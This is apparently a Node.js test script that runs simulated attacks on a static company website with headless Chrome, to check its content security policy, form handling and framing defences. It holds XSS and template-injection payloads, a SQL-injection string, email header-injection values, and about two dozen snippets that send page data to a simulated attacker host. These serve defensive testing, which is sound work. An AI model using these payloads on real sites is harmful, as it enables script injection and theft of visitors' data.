// Runs real attacks against the site in a simulated production environment, with headless Chrome as
// the victim's browser and logs on the attacker's server as proof of what got out.
//
// usage: node security/attack-tests.mjs [--root <built site>] [--label <name>] [--naive]
// With no --root it builds the current source into security/.results/build first.
import { spawnSync } from 'node:child_process';
import { mkdirSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import puppeteer from 'puppeteer-core';
import { httpChecks } from './http-checks.mjs';
import { externalLinks, scanBuild } from './scan-build.mjs';
import { sim, startSimulation } from './simulated-host.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const project = resolve(here, '..');
const flag = (name) => {
  const at = process.argv.indexOf(`--${name}`);
  return at > 0 ? process.argv[at + 1] : undefined;
};
const naive = process.argv.includes('--naive');
const label = flag('label') ?? (naive ? 'control' : 'hardened');
const resultsDir = join(here, '.results');
mkdirSync(resultsDir, { recursive: true });

const astro = (args, env = {}) =>
  spawnSync(process.execPath, [join(project, 'node_modules/astro/bin/astro.mjs'), ...args], {
    cwd: project,
    env: { ...process.env, ...env },
    encoding: 'utf8',
  });

const results = [];
const record = (group, test, pass, detail = '', scope = 'site') => {
  results.push({ group, test, pass: Boolean(pass), detail: String(detail), scope });
  console.log(`${pass ? 'PASS' : 'FAIL'}  [${group}] ${test}${detail ? `  (${detail})` : ''}`);
};

let root = flag('root');
const builtHere = !root && !naive;
if (naive) root = project;
if (builtHere) {
  root = join(resultsDir, 'build');
  rmSync(root, { recursive: true, force: true });
  const built = astro(['build', '--outDir', root], { PUBLIC_FORM_ENDPOINT: sim.endpoint });
  if (built.status !== 0) {
    console.error(built.stdout, built.stderr);
    process.exit(2);
  }
}

// The build refuses an endpoint that would send enquiries somewhere unsafe.
if (builtHere) {
  for (const [what, endpoint] of [['plain HTTP', 'http://forms.example/f/1'], ['script URL', 'javascript:alert(1)'], ['embedded credentials', 'https://user:pass@forms.example/f/1'], ['not a URL', 'forms.example']]) {
    const attempt = astro(['build', '--outDir', join(resultsDir, 'rejected')], { PUBLIC_FORM_ENDPOINT: endpoint });
    record('Sensitive Data Not Over SSL', `Build refuses a form endpoint with ${what}`, attempt.status !== 0, `exit ${attempt.status}`);
  }
  rmSync(join(resultsDir, 'rejected'), { recursive: true, force: true });
}

const simulation = await startSimulation({ root, naive });
const { logs } = simulation;
const origin = sim.site;
// The problem pages under Our Approach are read from the build, so each new one is tested without being listed here.
const subpages = (section) =>
  readdirSync(join(root, section), { withFileTypes: true })
    .filter((entry) => entry.isDirectory())
    .map((entry) => `/${section}/${entry.name}/`);
const pages = naive ? ['/index.html'] : ['/', '/services/', '/about/', '/approach/', ...subpages('approach'), '/contact/', '/privacy/'];

await httpChecks({
  origin,
  plain: sim.plain,
  connect: sim.connect,
  insecure: true,
  pages: naive ? ['/README.md'] : ['/', '/contact/'],
  asset: naive ? undefined : `/_astro/${readdirSync(join(root, '_astro'))[0]}`,
  record,
});

if (!naive) {
  const problems = scanBuild(root);
  const count = (pattern) => problems.filter((problem) => pattern.test(problem)).length;
  const scan = [
    ['XSS', 'No inline scripts or event handlers in the build', /inline script|event handler|script URL/],
    ['Configuration', 'No inline styles in the build', /inline style/],
    ['Malware', 'No third-party scripts in the build', /third-party/],
    ['XSS', 'No unsafe DOM or code sinks in the JavaScript', /unsafe DOM/],
    ['Source Code Disclosure', 'No source maps or development files in the build', /source map|development file/],
    ['Information Disclosure', 'No secrets, local paths or internal IPs in the build', /secret|local file|internal IP/],
    ['Information Disclosure', 'No HTML comments or generator tags in the build', /comment|generator/],
    ['Sensitive Data Not Over SSL', 'No insecure URLs in the build', /insecure URL/],
    ['Abuse Of Functionality', 'No unsafe target=_blank links in the build', /target=_blank/],
    ['Configuration', 'No second policy in a meta tag', /second policy/],
    ['XFS', 'No frames in the build', /frame in the page/],
  ];
  const links = externalLinks(root);
  record('Configuration', 'Broken link hijacking: no links to other sites that could go stale', links.length === 0, links[0] ?? 'none');
  for (const [group, test, pattern] of scan) {
    record(group, test, count(pattern) === 0, count(pattern) ? problems.find((problem) => pattern.test(problem)) : 'clean');
  }
}

let browser;
if (!naive) {
  browser = await puppeteer.launch({
    executablePath: process.env.CHROME_PATH ?? 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    headless: true,
    acceptInsecureCerts: true,
    args: ['--ignore-certificate-errors', '--disable-popup-blocking'],
  });
  const fresh = async () => {
    const context = await browser.createBrowserContext();
    const page = await context.newPage();
    await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'no-preference' }]);
    page.on('dialog', (dialog) => {
      page.__dialog = true;
      dialog.dismiss().catch(() => {});
    });
    return page;
  };
  const wait = (ms) => new Promise((done) => setTimeout(done, ms));
  const close = (page) => page.browserContext().close();

  // --- XSS, CSTI, prototype pollution, parameter pollution: hostile input through every URL part.
  const payloads = [
    '"><img src=x onerror="window.__pwn=1">',
    '<script>window.__pwn=1</script>',
    "'-(window.__pwn=1)-'",
    'javascript:window.__pwn=1',
    '<svg/onload=window.__pwn=1>',
    "{{constructor.constructor('window.__pwn=1')()}}",
    '${window.__pwn=1}',
  ];
  {
    const page = await fresh();
    let tried = 0;
    const hits = [];
    for (const path of [...pages, '/no-such-page/']) {
      for (const payload of payloads) {
        const encoded = encodeURIComponent(payload);
        for (const suffix of [`?q=${encoded}&motion=${encoded}&next=${encoded}`, `#${encoded}`, `#${payload}`]) {
          tried++;
          await page.goto(`${origin}${path}${suffix}`, { waitUntil: 'domcontentloaded' });
          await wait(25);
          const state = await page.evaluate(() => ({
            ran: window.__pwn === 1,
            planted: Boolean(document.querySelector('img[src="x"], svg[onload]')),
          }));
          if (state.ran || state.planted || page.__dialog) hits.push(`${path}${suffix}`);
        }
      }
    }
    record('XSS', `Reflected and DOM XSS: ${tried} attempts through query and fragment`, hits.length === 0, hits[0] ?? 'nothing executed or planted');

    await page.goto(`${origin}/?__proto__[polluted]=1&constructor[prototype][polluted]=1&__proto__.polluted=1#__proto__[polluted]=1`, { waitUntil: 'load' });
    record('XSS', 'Prototype pollution through the URL', await page.evaluate(() => ({}).polluted === undefined), 'Object.prototype unchanged');
    await page.goto(`${origin}/?q={{7*7}}&q=<b>x</b>&motion=on&motion=off`, { waitUntil: 'load' });
    const body = await page.evaluate(() => document.body.innerText);
    record('CSTI', 'Client-side template syntax in the URL is not evaluated', !/\b49\b/.test(body) && !body.includes('<b>x</b>'), 'not reflected');
    record('Http Parameter Pollution', 'Repeated parameters cause no change or error', await page.evaluate(() => document.querySelectorAll('main section').length > 0), 'page intact');
    await close(page);
  }

  // --- Debug switches: a production build should ignore the review aid.
  {
    const page = await fresh();
    await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'reduce' }]);
    await page.goto(`${origin}/?motion=on`, { waitUntil: 'load' });
    const forced = await page.evaluate(() => document.documentElement.classList.contains('motion'));
    record('Test Files', 'The ?motion=on review switch is off in production', !forced, forced ? 'overrode the reduced-motion setting' : 'setting respected');
    await close(page);
  }

  // --- Containment: assume an attacker has managed to run something, and see what it can do next.
  // Each attempt runs from a timer so that it is subject to the page's policy, not the test driver's.
  const attempts = [
    ['Run an injected inline <script>', (a) => { const s = document.createElement('script'); s.textContent = `window.__ran_${a.tag}=1`; document.head.append(s); }],
    ['Plant an <img onerror> through innerHTML', (a) => { document.body.insertAdjacentHTML('beforeend', `<img src="/x" onerror="window.__ran_${a.tag}=1">`); }],
    ['Add an inline onclick handler', (a) => { const b = document.createElement('button'); b.setAttribute('onclick', `window.__ran_${a.tag}=1`); document.body.append(b); b.click(); }],
    ['eval()', (a) => { (0, eval)(`window.__ran_${a.tag}=1`); }],
    ['new Function()', (a) => { new Function(`window.__ran_${a.tag}=1`)(); }],
    ['setTimeout with a string', (a) => { window.setTimeout(`window.__ran_${a.tag}=1`, 0); }],
    ['A javascript: link', (a) => { const l = document.createElement('a'); l.href = `javascript:window.__ran_${a.tag}=1`; document.body.append(l); l.click(); }],
    ['A data: URL script', (a) => { const s = document.createElement('script'); s.src = `data:text/javascript,window.__ran_${a.tag}=1`; document.head.append(s); }],
    ['A blob: URL script', (a) => { const s = document.createElement('script'); s.src = URL.createObjectURL(new Blob([`window.__ran_${a.tag}=1`], { type: 'text/javascript' })); document.head.append(s); }],
    ['A script from the attacker\'s site', (a) => { const s = document.createElement('script'); s.src = `${a.attacker}/evil.js?tag=${a.tag}`; document.head.append(s); }],
    ['A web worker from a blob', (a) => { new Worker(URL.createObjectURL(new Blob([`fetch('${a.attacker}/hit/${a.tag}')`], { type: 'text/javascript' }))); }],
    ['Send data out with fetch()', (a) => { fetch(`${a.attacker}/hit/${a.tag}?stolen=1`, { method: 'POST', mode: 'no-cors', body: 'name=victim' }); }],
    ['Send data out with sendBeacon()', (a) => { navigator.sendBeacon(`${a.attacker}/hit/${a.tag}`, 'name=victim'); }],
    ['Send data out with XMLHttpRequest', (a) => { const x = new XMLHttpRequest(); x.open('POST', `${a.attacker}/hit/${a.tag}`); x.send('name=victim'); }],
    ['Send data out with an image request', (a) => { new Image().src = `${a.attacker}/hit/${a.tag}?stolen=1`; }],
    ['Send data out over a WebSocket', (a) => { new WebSocket(`${a.attacker.replace('https', 'wss')}/hit/${a.tag}`); }],
    ['Send data out with EventSource', (a) => { new EventSource(`${a.attacker}/hit/${a.tag}`); }],
    ['Load a stylesheet from the attacker', (a) => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = `${a.attacker}/hit/${a.tag}.css`; document.head.append(l); }],
    ['Load a font from the attacker', (a) => { const f = new FontFace('x', `url(${a.attacker}/hit/${a.tag}.woff2)`); f.load().catch(() => {}); }],
    ['Frame the attacker\'s page', (a) => { const f = document.createElement('iframe'); f.src = `${a.attacker}/hit/${a.tag}`; document.body.append(f); }],
    ['Embed an <object> from the attacker', (a) => { const o = document.createElement('object'); o.data = `${a.attacker}/hit/${a.tag}`; document.body.append(o); }],
    ['Embed an <embed> from the attacker', (a) => { const o = document.createElement('embed'); o.src = `${a.attacker}/hit/${a.tag}`; document.body.append(o); }],
    ['Load audio from the attacker', (a) => { new Audio(`${a.attacker}/hit/${a.tag}`).load(); }],
    ['Prefetch from the attacker', (a) => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = `${a.attacker}/hit/${a.tag}`; document.head.append(l); }],
    ['Read form fields with injected CSS', (a) => { const s = document.createElement('style'); s.append(`input[name=name]{background:url(${a.attacker}/hit/${a.tag}.png) !important}`); document.head.append(s); }],
    ['Inline style attribute beacon', (a) => { const d = document.createElement('div'); d.setAttribute('style', `background:url(${a.attacker}/hit/${a.tag}.png)`); document.body.append(d); }],
    ['Hijack relative URLs with <base>', (a) => { const b = document.createElement('base'); b.href = `${a.attacker}/hit/`; document.head.prepend(b); new Image().src = `${a.tag}.png`; }],
  ];
  {
    const page = await fresh();
    for (const [index, [name, attack]] of attempts.entries()) {
      const tag = `t${index}`;
      await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
      const before = logs.attacker.length;
      await page.evaluate(`setTimeout(() => { try { (${attack.toString()})(${JSON.stringify({ tag, attacker: sim.attacker })}); } catch (error) { window.__threw = error.message; } }, 0);`).catch(() => {});
      await wait(350);
      const ran = await page.evaluate((flagName) => window[flagName] === 1, `__ran_${tag}`).catch(() => false);
      const reached = logs.attacker.slice(before).some((entry) => entry.path.includes(`/hit/${tag}`) || entry.query.includes(`tag=${tag}`));
      record('Containment', name, !ran && !reached, ran ? 'code ran' : reached ? 'reached attacker' : 'blocked');
    }
    await close(page);
  }

  // --- Form tampering: redirect enquiries to the attacker.
  const fill = async (page, values = {}) => {
    const data = { name: 'Test Person', company: 'Test Haulage Ltd', email: 'test@example.com', message: 'Test enquiry.', ...values };
    for (const [field, value] of Object.entries(data)) await page.$eval(`#${field}`, (el, v) => { el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); }, value);
  };
  const submit = async (page) => {
    await page.$eval('#enquiry button[type="submit"]', (button) => button.click());
    await wait(500);
  };
  {
    let page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page);
    let before = logs.attacker.length;
    await page.$eval('#enquiry', (form, url) => { form.action = url; form.noValidate = true; HTMLFormElement.prototype.submit.call(form); }, `${sim.attacker}/hit/formaction`);
    await wait(600);
    record('Containment', 'Point the form at the attacker and submit it', !logs.attacker.slice(before).some((entry) => entry.path.includes('formaction')), `browser stayed on ${new URL(page.url()).host}`);
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page);
    before = logs.attacker.length;
    await page.$eval('#enquiry', (form, url) => { form.dataset.endpoint = url; }, `${sim.attacker}/hit/endpoint`);
    await submit(page);
    record('Containment', 'Swap the script\'s endpoint for the attacker\'s', !logs.attacker.slice(before).some((entry) => entry.path.includes('endpoint')), await page.$eval('#form-status', (el) => el.textContent.trim().slice(0, 50)));
    await close(page);
  }

  // --- The form itself.
  {
    let page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page);
    const sent = logs.provider.length;
    await submit(page);
    const entry = logs.provider[sent];
    record('Sensitive Data Not Over SSL', 'Enquiries reach the provider over HTTPS, as POST, with nothing in the URL', entry && entry.method === 'POST' && entry.url === '/f/mist', entry ? `${entry.method} ${sim.provider}${entry.url}` : 'nothing arrived');
    record('Information Disclosure', 'The provider sees only the site origin as referrer, and no cookies', entry && !entry.cookie && (!entry.referer || new URL(entry.referer).pathname === '/'), entry ? `Referer: ${entry.referer ?? 'none'}` : 'nothing arrived');
    const ranProvider = await page.evaluate(() => window.__providerXss === 1);
    const planted = await page.$eval('#form-status', (el) => el.querySelector('img, script') !== null || el.textContent.includes('onerror'));
    record('XSS', 'A hostile response from the provider is never rendered', !ranProvider && !planted, await page.$eval('#form-status', (el) => el.textContent.trim().slice(0, 45)));
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page, { name: '<script>window.__storedXss=1</script>', message: `<img src=x onerror="window.__storedXss=1"> {{7*7}} '; DROP TABLE enquiries;--` });
    const before = logs.provider.length;
    await submit(page);
    record('XSS', 'Script typed into the form is sent as plain data and not run here', logs.provider.length === before + 1 && !(await page.evaluate(() => window.__storedXss === 1)), 'arrived as text; provider and inbox must not render it as HTML');
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await page.$eval('#email', (el) => { el.value = 'a@example.com\r\nBcc: victims@example.com'; });
    await page.$eval('#name', (el) => { el.value = 'x\r\nBcc: victims@example.com'; });
    const cleaned = await page.evaluate(() => [document.getElementById('email').value, document.getElementById('name').value]);
    record('CRLF Injection', 'Email header injection: line breaks cannot enter single-line fields', cleaned.every((value) => !/[\r\n]/.test(value)), 'browser strips them; a direct POST relies on the provider');
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page);
    await page.$eval('#company-website', (el) => { el.value = 'http://spam.example'; });
    const spamBefore = logs.provider.length;
    await submit(page);
    record('Abuse Of Functionality', 'The honeypot stops a filled-in bot submission', logs.provider.length === spamBefore, 'nothing sent');
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    const limits = await page.evaluate(() => ['name', 'company', 'email', 'telephone', 'message'].map((id) => document.getElementById(id).maxLength));
    record('Denial Of Service', 'Every field has a length limit', limits.every((limit) => limit > 0), limits.join(', '));
    await fill(page, { name: '   ', message: '   ' });
    const blankBefore = logs.provider.length;
    await submit(page);
    record('Abuse Of Functionality', 'Whitespace-only enquiries are refused', logs.provider.length === blankBefore, logs.provider.length === blankBefore ? 'not sent' : 'sent to the provider');
    await close(page);

    page = await fresh();
    await page.goto(`${origin}/contact/`, { waitUntil: 'load' });
    await fill(page);
    const doubleBefore = logs.provider.length;
    await page.$eval('#enquiry button[type="submit"]', (button) => { button.click(); button.click(); button.click(); });
    await wait(600);
    record('Abuse Of Functionality', 'Repeated clicks send one enquiry', logs.provider.length === doubleBefore + 1, `${logs.provider.length - doubleBefore} sent`);
    await close(page);
  }

  // --- Clickjacking, from a page on the attacker's site.
  {
    const framed = [];
    for (const path of pages) {
      const page = await fresh();
      await page.goto(`${sim.attacker}/frame?src=${encodeURIComponent(origin + path)}`, { waitUntil: 'load' });
      await wait(300);
      const child = page.frames().find((frame) => frame !== page.mainFrame());
      const loaded = child ? await child.evaluate(() => document.querySelector('main') !== null).catch(() => false) : false;
      if (loaded) framed.push(path);
      await close(page);
    }
    record('XFS', 'Clickjacking: no page can be framed by another site', framed.length === 0, framed.length ? `framed: ${framed.join(' ')}` : `${pages.length} pages refused`);
  }

  // --- A site that opens ours should have no handle on it.
  {
    const page = await fresh();
    await page.goto(`${sim.attacker}/opener`, { waitUntil: 'load' });
    const popupTarget = new Promise((done) => page.browserContext().once('targetcreated', done));
    await page.evaluate((url) => { window.__win = window.open(url); }, `${origin}/`);
    const popup = await (await popupTarget).page();
    await popup.waitForNavigation({ waitUntil: 'load', timeout: 5000 }).catch(() => {});
    const opener = await popup.evaluate(() => window.opener !== null);
    record('XFS', 'Cross-window access: an opening page keeps no handle on the site', !opener, opener ? 'window.opener is live' : 'window.opener is null');
    await close(page);
  }

  // --- Storage, and whether the browser exposes device features.
  {
    const page = await fresh();
    const requests = new Set();
    page.on('request', (req) => requests.add(new URL(req.url()).origin));
    for (const path of pages) await page.goto(`${origin}${path}`, { waitUntil: 'load' });
    const cookies = await page.browserContext().cookies();
    record('Session Fixation', 'The browser holds no cookies after visiting every page', cookies.length === 0, `${cookies.length} cookies`);
    const stored = await page.evaluate(() => [Object.keys(localStorage).length, Object.keys(sessionStorage).length]);
    record('Information Disclosure', 'Nothing is written to browser storage', stored[0] + stored[1] === 0, `${stored[0]} local, ${stored[1]} session`);
    const others = [...requests].filter((value) => value !== origin && !value.startsWith('data'));
    record('Malware', 'No page requests anything from another site', others.length === 0, others.join(' ') || 'same origin only');
    const policy = await page.evaluate(() => (document.featurePolicy ? ['camera', 'microphone', 'geolocation', 'payment', 'usb'].filter((feature) => document.featurePolicy.allowsFeature(feature)) : ['unsupported']));
    record('Configuration', 'Device features are switched off for the page', policy.length === 0, policy.join(' ') || 'camera, microphone, geolocation, payment and usb denied');
    await close(page);
  }

  // --- The site still works: the policy must not break a single script, style, font or image.
  {
    const violations = [];
    const errors = [];
    for (const [width, height] of [[1440, 900], [375, 812]]) {
      for (const motion of ['no-preference', 'reduce']) {
        const page = await fresh();
        await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: motion }]);
        await page.setViewport({ width, height });
        await page.evaluateOnNewDocument(() => {
          window.__violations = [];
          document.addEventListener('securitypolicyviolation', (event) => window.__violations.push(`${event.violatedDirective} ${event.blockedURI}`));
        });
        page.on('pageerror', (error) => errors.push(`${page.url()} ${error.message}`));
        page.on('requestfailed', (req) => errors.push(`failed ${req.url()}`));
        for (const path of pages) {
          await page.goto(`${origin}${path}`, { waitUntil: 'load' });
          await page.evaluate(async () => {
            const end = document.documentElement.scrollHeight;
            for (let y = 0; y < end; y += 500) {
              window.scrollTo({ top: y, behavior: 'instant' });
              await new Promise((done) => setTimeout(done, 15));
            }
            document.querySelector('[data-modal]')?.click();
            await new Promise((done) => setTimeout(done, 60));
          });
          const found = await page.evaluate(() => window.__violations);
          found.forEach((item) => violations.push(`${path}: ${item}`));
        }
        await close(page);
      }
    }
    record('Regression', 'No policy violations on any page, viewport or motion setting', violations.length === 0, violations[0] ?? `${pages.length * 4} page loads`);
    record('Regression', 'No script errors or failed requests while scrolling every page', errors.length === 0, errors[0] ?? 'clean');
  }
  await browser.close();
}

await simulation.stop();
const failed = results.filter((result) => !result.pass);
writeFileSync(join(resultsDir, `${label}.json`), JSON.stringify(results, null, 2));
console.log(`\n${label}: ${results.length - failed.length} passed, ${failed.length} failed, of ${results.length}`);
process.exit(failed.length && !flag('label') ? 1 : 0);
